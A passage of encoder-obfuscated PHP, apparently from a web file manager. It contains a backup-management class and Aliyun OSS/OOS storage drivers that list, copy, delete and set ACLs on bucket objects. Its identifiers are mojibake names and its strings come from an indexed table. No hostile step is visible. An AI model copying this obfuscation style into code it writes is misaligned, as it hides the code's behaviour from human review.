Ö‘ñÄ”]; $öš¤­²Î = Model($Æ¦£‹ç¬[762])->config(); if ($ÛĞ·ôÆ› && $öš¤­²Î[$Æ¦£‹ç¬[765]] != $ÛĞ·ôÆ›) { $°¸ğŸƒÒ = 0; } $this->checkStore($öš¤­²Î[$Æ¦£‹ç¬[765]]); if (self::$manual == 1) { self::$name .= $Æ¦£‹ç¬[11] . date($Æ¦£‹ç¬[767]); } $±­ª€èß = array($Æ¦£‹ç¬[765] => $öš¤­²Î[$Æ¦£‹ç¬[765]], $Æ¦£‹ç¬[32] => self::$name, $Æ¦£‹ç¬[763] => 0, $Æ¦£‹ç¬[768] => $öš¤­²Î[$Æ¦£‹ç¬[768]], $Æ¦£‹ç¬[769] => self::$manual, $Æ¦£‹ç¬[302] => array($Æ¦£‹ç¬[770] => array($Æ¦£‹ç¬[763] => 0), $Æ¦£‹ç¬[771] => array($Æ¦£‹ç¬[763] => 0, $Æ¦£‹ç¬[772] => 0, $Æ¦£‹ç¬[773] => 0, $Æ¦£‹ç¬[33] => $Æ¦£‹ç¬[12], $Æ¦£‹ç¬[774] => 0, $Æ¦£‹ç¬[505] => 0), $Æ¦£‹ç¬[775] => array($Æ¦£‹ç¬[763] => 0, $Æ¦£‹ç¬[772] => 0, $Æ¦£‹ç¬[773] => 0, $Æ¦£‹ç¬[774] => 0, $Æ¦£‹ç¬[505] => 0), $Æ¦£‹ç¬[199] => array($Æ¦£‹ç¬[763] => 0, $Æ¦£‹ç¬[776] => 0, $Æ¦£‹ç¬[777] => 0, $Æ¦£‹ç¬[778] => 0, $Æ¦£‹ç¬[779] => 0, $Æ¦£‹ç¬[476] => $°¸ğŸƒÒ, $Æ¦£‹ç¬[774] => 0, $Æ¦£‹ç¬[505] => 0)), $Æ¦£‹ç¬[774] => time(), $Æ¦£‹ç¬[505] => 0); $ÀÔÕÔùÂ = Model($Æ¦£‹ç¬[762])->insert($±­ª€èß); $±­ª€èß[$Æ¦£‹ç¬[407]] = $ÀÔÕÔùÂ; return $±­ª€èß; } private function checkStore($©Õö…ü) { $Ó ÖÇÌå =& $_SERVER[ Ö‘ñÄ”]; $¯üç¾Ê = Model($Ó ÖÇÌå[780])->listData($©Õö…ü); Model($Ó ÖÇÌå[780])->checkConfig($¯üç¾Ê); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ Ö‘ñÄ”][762])->findByName(self::$name); } return self::$option; } public static function set($êËÍÔû«) { $È¼Ì¶³Õ =& $_SERVER[ Ö‘ñÄ”]; $ãï–ÈÉ = self::get(); foreach ($êËÍÔû« as $Œ¦ç®Ê± => $¡¯ØÁ¼¨) { $¯ÇŸÌÃ = explode($È¼Ì¶³Õ[10], $Œ¦ç®Ê±); $¾¸„ô–¨ = count($¯ÇŸÌÃ); switch ($¾¸„ô–¨) { case 1: $ãï–ÈÉ[$¯ÇŸÌÃ[0]] = $¡¯ØÁ¼¨; break; case 2: $ãï–ÈÉ[$¯ÇŸÌÃ[0]][$¯ÇŸÌÃ[1]] = $¡¯ØÁ¼¨; break; case 3: $ãï–ÈÉ[$¯ÇŸÌÃ[0]][$¯ÇŸÌÃ[1]][$¯ÇŸÌÃ[2]] = $¡¯ØÁ¼¨; break; } } Model($È¼Ì¶³Õ[762])->update($ãï–ÈÉ[$È¼Ì¶³Õ[407]], $ãï–ÈÉ); self::$option = $ãï–ÈÉ; return self::$option; } public function keep() { $‹Äı¼‘× =& $_SERVER[ Ö‘ñÄ”]; $—Õ§ïù = self::get(); if ($—Õ§ïù[$‹Äı¼‘×[302]][$‹Äı¼‘×[770]][$‹Äı¼‘×[763]] == $‹Äı¼‘×[88]) { return; } $this->backupKeep($—Õ§ïù); self::set(array($‹Äı¼‘×[781] => 1)); } private function backupKeep($ºÁ”Ûïƒ) { $½‚º²ÌĞ =& $_SERVER[ Ö‘ñÄ”]; if (self::$manual == 1) { return; } $©ĞÏ¯ĞÅ = Model($½‚º²ÌĞ[762])->listData(); if (empty($©ĞÏ¯ĞÅ)) { return; } $”›·İÆÕ = 0; $¯ØÎõÈİ = array(); foreach ($©ĞÏ¯ĞÅ as $™„´©ÕÆ) { if ($”›·İÆÕ >= 7) { break; } $¯ØÎõÈİ[] = $™„´©ÕÆ[$½‚º²ÌĞ[32]]; $”›·İÆÕ++; } for ($”›·İÆÕ = 0; $”›·İÆÕ < 12; $”›·İÆÕ++) { $¯ØÎõÈİ[] = date($½‚º²ÌĞ[782], strtotime("\x2d{$”›·İÆÕ}\40\x6d\157\156\x74\x68\163")); } $¯ØÎõÈİ = array_unique($¯ØÎõÈİ); $é¹–êÙÚ = Model($½‚º²ÌĞ[783])->get($½‚º²ÌĞ[784]); foreach ($©ĞÏ¯ĞÅ as $™„´©ÕÆ) { if (isset($™„´©ÕÆ[$½‚º²ÌĞ[769]]) && $™„´©ÕÆ[$½‚º²ÌĞ[769]] == $½‚º²ÌĞ[88]) { continue; } if (!empty($™„´©ÕÆ[$½‚º²ÌĞ[32]]) && in_array($™„´©ÕÆ[$½‚º²ÌĞ[32]], $¯ØÎõÈİ)) { continue; } Model($½‚º²ÌĞ[762])->remove($™„´©ÕÆ[$½‚º²ÌĞ[407]]); $ïÒ³’•¡ = $this->backupPath($ºÁ”Ûïƒ, $é¹–êÙÚ); IO::remove($ïÒ³’•¡, !1); } } private function backupPath($±íœ£ì, $¦ÁÆğÃ = false) { $ÚÁ–¿Ûî =& $_SERVER[ Ö‘ñÄ”]; if (!$¦ÁÆğÃ) { $¦ÁÆğÃ = Model($ÚÁ–¿Ûî[783])->get($ÚÁ–¿Ûî[784]); } $ŞèÙì‘ø = $±íœ£ì[$ÚÁ–¿Ûî[32]]; $ÅÜ‚«÷„ = substr(md5($ÚÁ–¿Ûî[785] . $¦ÁÆğÃ . $ŞèÙì‘ø), 0, 8); return "\173\x69\157\x3a{$±íœ£ì[$ÚÁ–¿Ûî[765]]}\x7d\x2f\x64\x61\x74\141\142\x61\x73\x65\57\x62\x61\143\x6b\165\x70\57" . $ŞèÙì‘ø . $ÚÁ–¿Ûî[11] . $ÅÜ‚«÷„; } public function db() { $ŒƒÉÄ¾ =& $_SERVER[ Ö‘ñÄ”]; $®Ÿ’ • = self::get(); if ($®Ÿ’ •[$ŒƒÉÄ¾[302]][$ŒƒÉÄ¾[771]][$ŒƒÉÄ¾[763]] == $ŒƒÉÄ¾[88]) { return !0; } $‘ŠĞäŒ¥ = new BackupDb(); if (!$‘ŠĞäŒ¥->index()) { return !1; } self::set(array($ŒƒÉÄ¾[786] => 1)); return !0; } public function dbFile() { $ÊÁÃ‰« =& $_SERVER[ Ö‘ñÄ”]; $ŸÖ™¸®” = self::get(); if ($ŸÖ™¸®”[$ÊÁÃ‰«[302]][$ÊÁÃ‰«[775]][$ÊÁÃ‰«[763]] == $ÊÁÃ‰«[88]) { return !0; } $ë°ßâÀ„ = new BackupDbFile(); if (!$ë°ßâÀ„->index()) { return !1; } self::set(array($ÊÁÃ‰«[787] => 1)); return !0; } public function file() { $¾‰‡—·— =& $_SERVER[ Ö‘ñÄ”]; $©—ùÉ™Ó = self::get(); if ($©—ùÉ™Ó[$¾‰‡—·—[302]][$¾‰‡—·—[199]][$¾‰‡—·—[763]] == $¾‰‡—·—[88]) { return !0; } if (!isset($©—ùÉ™Ó[$¾‰‡—·—[768]]) || $©—ùÉ™Ó[$¾‰‡—·—[768]] == $¾‰‡—·—[197]) { $“æÏèÎ­ = new BackupFile(); if (!$“æÏèÎ­->index()) { return !1; } } self::set(array($¾‰‡—·—[788] => 1, $¾‰‡—·—[763] => 1)); return !0; } } goto bŞæ«÷Â; F‚áÖ—Ê³–: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($úĞÄƒ­¼) { parent::__construct($úĞÄƒ­¼); $this->signatureVersion($_SERVER[ Ö‘ñÄ”][216]); } public function fileOutLink($—ÄÌ•¡) { $Ş¤Â—ãÕ =& $_SERVER[ Ö‘ñÄ”]; if (substr($—ÄÌ•¡, 0, 7) == $Ş¤Â—ãÕ[1331]) { $—ÄÌ•¡ = $Ş¤Â—ãÕ[1332] . substr($—ÄÌ•¡, 7); } header($Ş¤Â—ãÕ[161] . $—ÄÌ•¡); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($ïµ†Ò­) { parent::__construct(); include_once SDK_DIR . $_SERVER[ Ö‘ñÄ”][1388]; $this->_init($ïµ†Ò­); } public function _init($Èå’½¼) { $ºª•¯É¢ =& $_SERVER[ Ö‘ñÄ”]; foreach ($Èå’½¼ as $¢İ©ÛÉ => $ĞéñÊÑ„) { if (isset($this->{$¢İ©ÛÉ})) { $this->{$¢İ©ÛÉ} = $ĞéñÊÑ„; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ºª•¯É¢[1389] . LNG($ºª•¯É¢[1390])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ü¤Î§ê =& $_SERVER[ Ö‘ñÄ”]; $İĞığÅÜ = new OSS\Model\CorsConfig(); $ÀÏÅØˆˆ = new OSS\Model\CorsRule(); $ÀÏÅØˆˆ->addAllowedOrigin($ü¤Î§ê[1391]); $ÀÏÅØˆˆ->addAllowedMethod($ü¤Î§ê[1392]); $ÀÏÅØˆˆ->addAllowedMethod($ü¤Î§ê[1393]); $ÀÏÅØˆˆ->addAllowedMethod($ü¤Î§ê[1394]); $ÀÏÅØˆˆ->addAllowedMethod($ü¤Î§ê[1395]); $ÀÏÅØˆˆ->addAllowedMethod($ü¤Î§ê[160]); $ÀÏÅØˆˆ->setMaxAgeSeconds(600); $ÀÏÅØˆˆ->addExposeHeader($ü¤Î§ê[1396]); $ÀÏÅØˆˆ->addAllowedHeader($ü¤Î§ê[1391]); $İĞığÅÜ->addRule($ÀÏÅØˆˆ); try { $this->client->putBucketCors($this->bucket, $İĞığÅÜ); } catch (OSS\Core\OssException $‡èöÉ¦©) { return !1; } return !0; } public function getBucketCors() { $òı¨èÓâ =& $_SERVER[ Ö‘ñÄ”]; $¼…ùøÂµ = null; try { $¼…ùøÂµ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ª³¯¡Äì) { return null; } if (!$¼…ùøÂµ || !($¥†ğé“­ = $¼…ùøÂµ->getRules())) { return null; } $µëÉ„Ïë = $¥†ğé“­[0]->getAllowedOrigins(); $‡›ÈÆáÀ = $¥†ğé“­[0]->getAllowedMethods(); $¡¹ı®Æ = $¥†ğé“­[0]->getMaxAgeSeconds(); $Ó±¸¸‡™ = $¥†ğé“­[0]->getExposeHeaders(); $÷¯ öğ„ = $¥†ğé“­[0]->getAllowedHeaders(); return array($òı¨èÓâ[187] => isset($µëÉ„Ïë[0]) ? $µëÉ„Ïë[0] : $òı¨èÓâ[12], $òı¨èÓâ[191] => $‡›ÈÆáÀ, $òı¨èÓâ[1397] => $¡¹ı®Æ, $òı¨èÓâ[1398] => isset($Ó±¸¸‡™[0]) ? $Ó±¸¸‡™[0] : $òı¨èÓâ[12], $òı¨èÓâ[189] => isset($÷¯ öğ„[0]) ? $÷¯ öğ„[0] : $òı¨èÓâ[12]); } public function isBucketCors() { $Üù¨œ÷Ÿ =& $_SERVER[ Ö‘ñÄ”]; $Ñ‚°³Â˜ = $this->getBucketCors(); if (!$Ñ‚°³Â˜ || !is_array($Ñ‚°³Â˜)) { return !1; } if ($Ñ‚°³Â˜[$Üù¨œ÷Ÿ[187]] != $Üù¨œ÷Ÿ[188] || $Ñ‚°³Â˜[$Üù¨œ÷Ÿ[189]] != $Üù¨œ÷Ÿ[188]) { return !1; } $™ê—Âœ” = array_map($Üù¨œ÷Ÿ[190], $Ñ‚°³Â˜[$Üù¨œ÷Ÿ[191]]); if (!is_array($™ê—Âœ”)) { $™ê—Âœ” = array(); } $ö¸ó÷àª = array($Üù¨œ÷Ÿ[192], $Üù¨œ÷Ÿ[193], $Üù¨œ÷Ÿ[194], $Üù¨œ÷Ÿ[195], $Üù¨œ÷Ÿ[196]); $©¦èñÒ = array_diff($ö¸ó÷àª, $™ê—Âœ”); return empty($©¦èñÒ); } public function mkfile($ÏŒ‘Äù, $“ùüØ° = '', $©çë¶ãÆ = REPEAT_RENAME) { $„µ‘ä¥Ù = $this->setContent($ÏŒ‘Äù, $“ùüØ°); if ($„µ‘ä¥Ù !== !1) { return $this->getPathOuter($ÏŒ‘Äù); } return !1; } public function mkdir($ù¡öáƒ„, $©ˆ¨÷± = REPEAT_SKIP) { if ($©ˆ¨÷± && $this->_isFolder($ù¡öáƒ„)) { return $this->getPathOuter($ù¡öáƒ„); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ù¡öáƒ„)); } catch (OSS\Core\OssException $ƒë¥‡õŞ) { return !1; } return $this->getPathOuter($ù¡öáƒ„); } private function fileList($ºœ¼…æå, $ÙÕ¹Û¼Å = '', $ëğì¸Î = 0) { $š½™ªëô =& $_SERVER[ Ö‘ñÄ”]; $ºœ¼…æå = trim($ºœ¼…æå, $š½™ªëô[8]); $Èúà³İü = empty($ºœ¼…æå) && $ºœ¼…æå !== $š½™ªëô[197] ? $š½™ªëô[12] : $ºœ¼…æå . $š½™ªëô[8]; $âŸøµÍµ = $š½™ªëô[12]; $º³Ş×èŸ = 1000; $ë·ÓîÙœ = $¦—ª¤Ê = array(); while (!0) { check_abort(); $¸â“èÙ³ = array($š½™ªëô[1399] => $ÙÕ¹Û¼Å, $š½™ªëô[1400] => $Èúà³İü, $š½™ªëô[1401] => $º³Ş×èŸ, $š½™ªëô[1402] => $âŸøµÍµ); try { $ºº©ê« = $this->client->listObjects($this->bucket, $¸â“èÙ³); } catch (OSS\Core\OssException $»¼ÜèÀ) { break; } $âŸøµÍµ = $ºº©ê«->getNextMarker(); $ØÜƒÛÁ = $ºº©ê«->getObjectList(); $ó¤…Ã«È = $ºº©ê«->getPrefixList(); foreach ($ØÜƒÛÁ as $³á™®Ê”) { if ($³á™®Ê”->getKey() == $Èúà³İü) { continue; } $Œê ò¹á = $³á™®Ê”->getKey(); $Ø§ÂòÛ = $³á™®Ê”->getSize(); $òéÕÇºŠ = $³á™®Ê”->getLastModified(); $“î˜œÖ¹ = $ëğì¸Î ? array($š½™ªëô[32] => $Œê ò¹á, $š½™ªëô[76] => $Ø§ÂòÛ, $š½™ªëô[203] => strtotime($òéÕÇºŠ)) : $Œê ò¹á; $ï˜·¹˜ = $Ø§ÂòÛ == 0 && substr($Œê ò¹á, strlen($Œê ò¹á) - 1, 1) == $š½™ªëô[8] ? !0 : !1; $ÃÅ¸ïí = array($š½™ªëô[76] => $Ø§ÂòÛ, $š½™ªëô[1403] => $Ø§ÂòÛ, $š½™ªëô[85] => strtotime($òéÕÇºŠ), $š½™ªëô[1404] => $òéÕÇºŠ); $this->cacheMethodInfoSet($Œê ò¹á, $ï˜·¹˜, $ÃÅ¸ïí); if ($ï˜·¹˜) { $ë·ÓîÙœ[] = $Œê ò¹á; continue; } $¦—ª¤Ê[] = $“î˜œÖ¹; } foreach ($ó¤…Ã«È as $ÜÂ¥İ·ã) { $ë·ÓîÙœ[] = $ÜÂ¥İ·ã->getPrefix(); $this->cacheMethodInfoSet($ÜÂ¥İ·ã->getPrefix(), !0); } if ($âŸøµÍµ === $š½™ªëô[12]) { break; } } $this->cacheMethodInfoSet($ºœ¼…æå, !0); return array($š½™ªëô[82] => $ë·ÓîÙœ, $š½™ªëô[83] => $¦—ª¤Ê); } public function copyFile($¯³ÜØÖ, $ğæÉ€ÂŠ) { $¯¢åĞ‹› = $this->size($¯³ÜØÖ); if ($¯¢åĞ‹› < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¯³ÜØÖ, $this->bucket, $this->pathEncode($ğæÉ€ÂŠ)); } catch (OSS\Core\OssException $‡ÓÎóìÃ) { return !1; } return $this->getPathOuter($ğæÉ€ÂŠ); } $š¬´âëá = $this->multiCopyObject($¯³ÜØÖ, $ğæÉ€ÂŠ, $¯¢åĞ‹›); return $š¬´âëá ? $this->getPathOuter($ğæÉ€ÂŠ) : !1; } private function multiCopyObject($ÍÂÚ§, $²¨×ÖŞ¼, $Òè‚óıÚ) { $¾ß‡Ô¾æ =& $_SERVER[ Ö‘ñÄ”]; try { $²™ƒºï = array(); if ($Å«¤ë» = $this->hashMd5($ÍÂÚ§)) { $²™ƒºï = array(OSS\OssClient::OSS_HEADERS => array($¾ß‡Ô¾æ[1405] => $Å«¤ë»)); } $§Ô¥ùñ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($²¨×ÖŞ¼), $²™ƒºï); $ŠÖ¬©ˆ’ = 1; $ÁÚÁƒ‡ = 0; $ï’¾ä¶ = array(); $ïî¥ÅŠ´ = 1024 * 1024 * 10; $Şø²Ü·½ = $this->client->generateMultiuploadParts($Òè‚óıÚ, $ïî¥ÅŠ´); foreach ($Şø²Ü·½ as $ÄàÚ–Ûé => $ì›ºÔ©‹) { $‚…ßÓ¯Æ = $ÁÚÁƒ‡ + (int) $ì›ºÔ©‹[$¾ß‡Ô¾æ[1406]]; $Ü ºû‚ = (int) $ì›ºÔ©‹[$¾ß‡Ô¾æ[346]] + $‚…ßÓ¯Æ - 1; $“ÖäÌÒØ = array($¾ß‡Ô¾æ[1407] => $‚…ßÓ¯Æ, $¾ß‡Ô¾æ[1408] => $Ü ºû‚); $ï’¾ä¶[] = $this->client->uploadPartCopy($this->bucket, $ÍÂÚ§, $this->bucket, $this->pathEncode($²¨×ÖŞ¼), $ŠÖ¬©ˆ’, $§Ô¥ùñ, $“ÖäÌÒØ); $ŠÖ¬©ˆ’ = $ŠÖ¬©ˆ’ + 1; } $È½êÙ„Ô = array(); foreach ($ï’¾ä¶ as $ÄàÚ–Ûé => $õÈïú¢¡) { $È½êÙ„Ô[] = array($¾ß‡Ô¾æ[1409] => $ÄàÚ–Ûé + 1, $¾ß‡Ô¾æ[1410] => $õÈïú¢¡); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($²¨×ÖŞ¼), $§Ô¥ùñ, $È½êÙ„Ô); } catch (OSS\Core\OssException $Ù ÊØ³—) { return !1; } return !0; } public function moveFile($àË¦ÜÕÃ, $ç’±×´º) { if ($this->copyFile($àË¦ÜÕÃ, $ç’±×´º)) { $this->remove($àË¦ÜÕÃ); return $this->getPathOuter($ç’±×´º); } return !1; } public function delFile($ÑŠœÑê) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÑŠœÑê)); } catch (OSS\Core\OssException $û™Õ•ê) { return !1; } return !0; } public function delFolder($¤¥åâÏ·) { $êÙùü‹÷ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->exist($¤¥åâÏ·)) { return !0; } $this->listItemCache = !1; $»ã³­ = $this->fileList($¤¥åâÏ·); $this->listItemCache = !0; $¹ô¢Ïµ… = trim($¤¥åâÏ·, $êÙùü‹÷[8]) . $êÙùü‹÷[8]; if (!empty($¤¥åâÏ·) && $¤¥åâÏ· !== $êÙùü‹÷[197] && !in_array($¹ô¢Ïµ…, $»ã³­[$êÙùü‹÷[82]])) { $»ã³­[$êÙùü‹÷[82]][] = $¹ô¢Ïµ…; } $¼¦‰œã‰ = $this->delByBatch($»ã³­[$êÙùü‹÷[83]]); if (!$¼¦‰œã‰) { return !1; } $¼¦‰œã‰ = $this->delByBatch($»ã³­[$êÙùü‹÷[82]]); if (!$¼¦‰œã‰) { return !1; } return $this->delFile($¹ô¢Ïµ…); } private function delByBatch($ìÅ§ûş¾) { foreach (array_chunk($ìÅ§ûş¾, 1000) as $†ì´üÙ‹) { try { $this->client->deleteObjects($this->bucket, $†ì´üÙ‹); } catch (OSS\Core\OssException $ùş•ò·Å) { return !1; } } return !0; } public function rename($ŒÅïÎ“, $Æ×ëó¾ò) { return $this->renameObject($ŒÅïÎ“, $Æ×ëó¾ò); } private function fileInfo($ü©“æ«Õ, $Ğ¡“ÌÃÈ = false, $´—É–ùÜ = array()) { $„¸Û™–€ =& $_SERVER[ Ö‘ñÄ”]; $†Ñôë‡ø = array($„¸Û™–€[32] => $this->pathThis($ü©“æ«Õ), $„¸Û™–€[84] => $this->getPathOuter($ü©“æ«Õ), $„¸Û™–€[33] => $„¸Û™–€[199], $„¸Û™–€[76] => isset($´—É–ùÜ[$„¸Û™–€[76]]) ? $´—É–ùÜ[$„¸Û™–€[76]] : 0, $„¸Û™–€[174] => $this->ext($ü©“æ«Õ)); if ($Ğ¡“ÌÃÈ) { return $†Ñôë‡ø; } $†Ñôë‡ø[$„¸Û™–€[200]] = $†Ñôë‡ø[$„¸Û™–€[85]] = 0; $†Ñôë‡ø[$„¸Û™–€[201]] = $†Ñôë‡ø[$„¸Û™–€[202]] = !0; if (empty($´—É–ùÜ)) { $Ôî½™Ô§ = $this->objectMeta($ü©“æ«Õ); if (!$Ôî½™Ô§) { return $†Ñôë‡ø; } $´—É–ùÜ = array($„¸Û™–€[85] => strtotime($Ôî½™Ô§[$„¸Û™–€[1404]]), $„¸Û™–€[76] => $Ôî½™Ô§[$„¸Û™–€[1403]] + 0); } if (isset($´—É–ùÜ[$„¸Û™–€[76]])) { $†Ñôë‡ø[$„¸Û™–€[76]] = $´—É–ùÜ[$„¸Û™–€[76]]; } if (isset($´—É–ùÜ[$„¸Û™–€[85]])) { $†Ñôë‡ø[$„¸Û™–€[85]] = $´—É–ùÜ[$„¸Û™–€[85]]; } if (isset($´—É–ùÜ[$„¸Û™–€[203]]) && !trim($†Ñôë‡ø[$„¸Û™–€[85]])) { $†Ñôë‡ø[$„¸Û™–€[85]] = $´—É–ùÜ[$„¸Û™–€[203]]; } return $†Ñôë‡ø; } private function folderInfo($ÖüåÓÉİ, $Ù¨ÙÓíÃ = false, $òª•ÛÈ‰ = array()) { $¥ùè¸ŞÈ =& $_SERVER[ Ö‘ñÄ”]; $ÒºÏ‹Óü = array($¥ùè¸ŞÈ[32] => $this->pathThis($ÖüåÓÉİ), $¥ùè¸ŞÈ[84] => $this->getPathOuter($¥ùè¸ŞÈ[8] . $ÖüåÓÉİ), $¥ùè¸ŞÈ[33] => $¥ùè¸ŞÈ[75]); if ($Ù¨ÙÓíÃ) { return $ÒºÏ‹Óü; } $ÒºÏ‹Óü[$¥ùè¸ŞÈ[200]] = $ÒºÏ‹Óü[$¥ùè¸ŞÈ[85]] = 0; $ÒºÏ‹Óü[$¥ùè¸ŞÈ[201]] = $ÒºÏ‹Óü[$¥ùè¸ŞÈ[202]] = !0; if (empty($òª•ÛÈ‰)) { $ÖüåÓÉİ = rtrim($ÖüåÓÉİ, $¥ùè¸ŞÈ[8]) . $¥ùè¸ŞÈ[8]; $Û¿èí° = $this->objectMeta($ÖüåÓÉİ); if (!$Û¿èí°) { return $ÒºÏ‹Óü; } $òª•ÛÈ‰ = array($¥ùè¸ŞÈ[200] => $Û¿èí°[$¥ùè¸ŞÈ[519]][$¥ùè¸ŞÈ[1411]], $¥ùè¸ŞÈ[85] => strtotime($Û¿èí°[$¥ùè¸ŞÈ[1404]])); } if (isset($òª•ÛÈ‰[$¥ùè¸ŞÈ[85]])) { $ÒºÏ‹Óü[$¥ùè¸ŞÈ[85]] = $òª•ÛÈ‰[$¥ùè¸ŞÈ[85]]; } if (isset($òª•ÛÈ‰[$¥ùè¸ŞÈ[200]])) { $ÒºÏ‹Óü[$¥ùè¸ŞÈ[200]] = $òª•ÛÈ‰[$¥ùè¸ŞÈ[200]]; } return $ÒºÏ‹Óü; } public function listPath($ÏçğÚ¬ò, $¾ø£Ê¦Ÿ = false) { $Õ ÔÕùñ =& $_SERVER[ Ö‘ñÄ”]; $ş ”œ¬» = $this->fileList($ÏçğÚ¬ò, $Õ ÔÕùñ[8], !0); foreach ($ş ”œ¬»[$Õ ÔÕùñ[82]] as $§®’Ê¨à => $ÏôÍü¿ø) { $ş ”œ¬»[$Õ ÔÕùñ[82]][$§®’Ê¨à] = $this->folderInfo($ÏôÍü¿ø, $¾ø£Ê¦Ÿ, $ÏôÍü¿ø); } foreach ($ş ”œ¬»[$Õ ÔÕùñ[83]] as $§®’Ê¨à => $ÏôÍü¿ø) { $ş ”œ¬»[$Õ ÔÕùñ[83]][$§®’Ê¨à] = $this->fileInfo($ÏôÍü¿ø[$Õ ÔÕùñ[32]], $¾ø£Ê¦Ÿ, $ÏôÍü¿ø); } return $ş ”œ¬»; } protected function infoChildren($Õ ¦×¶È, &$³«ÉÄ­ ) { $«şÛé¤Ú =& $_SERVER[ Ö‘ñÄ”]; $ˆ“üûŸ¢ = $this->fileList($Õ ¦×¶È, $«şÛé¤Ú[12], !0); $³«ÉÄ­ [$«şÛé¤Ú[78]] += count($ˆ“üûŸ¢[$«şÛé¤Ú[82]]); $³«ÉÄ­ [$«şÛé¤Ú[77]] += count($ˆ“üûŸ¢[$«şÛé¤Ú[83]]); foreach ($ˆ“üûŸ¢[$«şÛé¤Ú[83]] as $Åı™œä¥) { if (!$Åı™œä¥ || !$Åı™œä¥[$«şÛé¤Ú[76]]) { continue; } $³«ÉÄ­ [$«şÛé¤Ú[76]] += $Åı™œä¥[$«şÛé¤Ú[76]]; } } public function has($öÈ·¯, $Œ…Ñ¾í = false, $ê¥½•˜† = true) { $¤ÎíƒÂ =& $_SERVER[ Ö‘ñÄ”]; $öÈ·¯ = trim($öÈ·¯, $¤ÎíƒÂ[8]); $™ü¼•Šá = empty($öÈ·¯) && $öÈ·¯ !== $¤ÎíƒÂ[197] ? $¤ÎíƒÂ[12] : $öÈ·¯ . $¤ÎíƒÂ[8]; $¨ÙÙÄ‰ = $¤ÎíƒÂ[12]; $ãäñ£©Ä = 500; $…ÂÊÄ° = $„Ñ¾ñŸ = 0; while (!0) { check_abort(); $¢ˆï…¯¯ = array($¤ÎíƒÂ[1399] => $¤ÎíƒÂ[8], $¤ÎíƒÂ[1400] => $™ü¼•Šá, $¤ÎíƒÂ[1401] => $ãäñ£©Ä, $¤ÎíƒÂ[1402] => $¨ÙÙÄ‰); try { $†ûî€–Š = $this->client->listObjects($this->bucket, $¢ˆï…¯¯); } catch (OSS\Core\OssException $£¸ñØ˜) { break; } $¨ÙÙÄ‰ = $†ûî€–Š->getNextMarker(); $¤“‘ÙÀ° = $†ûî€–Š->getObjectList(); $¼È§Æ¡‰ = $†ûî€–Š->getPrefixList(); if ($Œ…Ñ¾í) { if (count($¤“‘ÙÀ°) > 1 || count($¤“‘ÙÀ°) == 1 && $¤“‘ÙÀ°[0]->getKey() != $™ü¼•Šá) { $…ÂÊÄ° += count($¤“‘ÙÀ°) - 1; } if (!empty($¼È§Æ¡‰)) { $„Ñ¾ñŸ += count($¼È§Æ¡‰); } if ($¨ÙÙÄ‰ === $¤ÎíƒÂ[12]) { break; } continue; } if ($ê¥½•˜†) { if (!empty($¤“‘ÙÀ°)) { if (count($¤“‘ÙÀ°) > 1 || $¤“‘ÙÀ°[0]->getKey() != $™ü¼•Šá) { return !0; } } } else { if (!empty($¼È§Æ¡‰)) { return !0; } } if ($¨ÙÙÄ‰ === $¤ÎíƒÂ[12]) { break; } } if ($Œ…Ñ¾í) { return array($¤ÎíƒÂ[207] => $…ÂÊÄ°, $¤ÎíƒÂ[208] => $„Ñ¾ñŸ); } return !1; } public function listAll($–šùÒÇñ) { $™ìâÃ£¾ =& $_SERVER[ Ö‘ñÄ”]; $ÚŒ¯›Æš = $this->fileList($–šùÒÇñ, $™ìâÃ£¾[12], !0); $€À§µ¥ú = array(); foreach ($ÚŒ¯›Æš[$™ìâÃ£¾[83]] as $Ûñ’ˆá ) { $€À§µ¥ú[$Ûñ’ˆá [$™ìâÃ£¾[32]]] = $Ûñ’ˆá [$™ìâÃ£¾[76]]; } foreach ($ÚŒ¯›Æš[$™ìâÃ£¾[82]] as $Ûñ’ˆá ) { if (is_string($Ûñ’ˆá )) { $€À§µ¥ú[$Ûñ’ˆá ] = 0; } } return $this->listAllFiles($–šùÒÇñ, array_keys($€À§µ¥ú), $€À§µ¥ú); } public function canRead($ÀÅÚëü™) { $˜Ò‹œîô =& $_SERVER[ Ö‘ñÄ”]; $½¨åšü› = $this->pathAcl($ÀÅÚëü™); return $½¨åšü› == $˜Ò‹œîô[1412] || $½¨åšü› == $˜Ò‹œîô[564] ? !0 : !1; } public function canWrite($ã£®ÊÅ) { $ĞşË‹Ùë = $this->pathAcl($ã£®ÊÅ); return $ĞşË‹Ùë == $_SERVER[ Ö‘ñÄ”][564] ? !0 : !1; } public function pathAcl($âÈŞ•Ê¼) { $¤é¢—ÌÒ =& $_SERVER[ Ö‘ñÄ”]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $º’ÄİÆË = $this->client->getObjectAcl($this->bucket, $this->pathEncode($âÈŞ•Ê¼)); } catch (OSS\Core\OssException $Ï™¸º®) { return !1; } $ç‡§ºĞÑ = $º’ÄİÆË == $¤é¢—ÌÒ[37] ? $this->bucketAcl : $º’ÄİÆË; if ($ç‡§ºĞÑ == $¤é¢—ÌÒ[1413]) { return $¤é¢—ÌÒ[1412]; } if ($ç‡§ºĞÑ == $¤é¢—ÌÒ[1414]) { return $¤é¢—ÌÒ[564]; } return $ç‡§ºĞÑ; } private function chmodPath($ÁĞÁ‹©Û, $³ù´™İ = '') { $Äğê…¼Á =& $_SERVER[ Ö‘ñÄ”]; $€ÃŒ¿¡ä = empty($³ù´™İ) ? $Äğê…¼Á[1414] : $³ù´™İ; $ñ°Ç‚´õ = array($Äğê…¼Á[37], $Äğê…¼Á[198], $Äğê…¼Á[1413], $Äğê…¼Á[1414]); if 